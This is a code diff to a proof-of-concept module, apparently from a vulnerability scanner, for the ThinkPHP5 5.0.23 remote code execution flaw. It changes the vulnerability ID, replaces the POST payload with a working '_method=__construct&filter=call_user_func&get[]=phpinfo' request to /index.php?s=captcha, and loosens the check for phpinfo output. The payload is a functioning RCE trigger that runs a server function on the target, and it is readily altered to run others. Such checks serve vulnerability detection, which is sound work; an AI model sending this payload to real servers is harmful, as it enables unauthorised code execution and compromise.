@@ -18,7 +18,7 @@ class POC(POCBase):
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "ThinkPHP5 5.0.23 远程代码执行漏洞",                        # 漏洞名称
-        "VulnID" : "Blen-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
         "AppName" : "ThinkPHP5",                     # 漏洞应用名称
         "AppVersion" : "ThinkPHP5 <= 5.0.23",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
@@ -45,8 +45,9 @@ class POC(POCBase):
         """
         vuln = [False,""]
         url = self.target + "/index.php?s=captcha" # url自己按需调整
-        data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1"
-
+        # data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1"
+        data = "_method=__construct&method=get&filter=call_user_func&get[]=phpinfo"
+        
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
                     "Content-Type": "application/x-www-form-urlencoded",
@@ -57,10 +58,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "PHP Version" in req.text and \
-                "Configure Command" in req.text and \
-                    "<title>phpinfo()</title>" in req.text and \
-                        req.status_code == 200:
+            if "<title>phpinfo()</title>" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
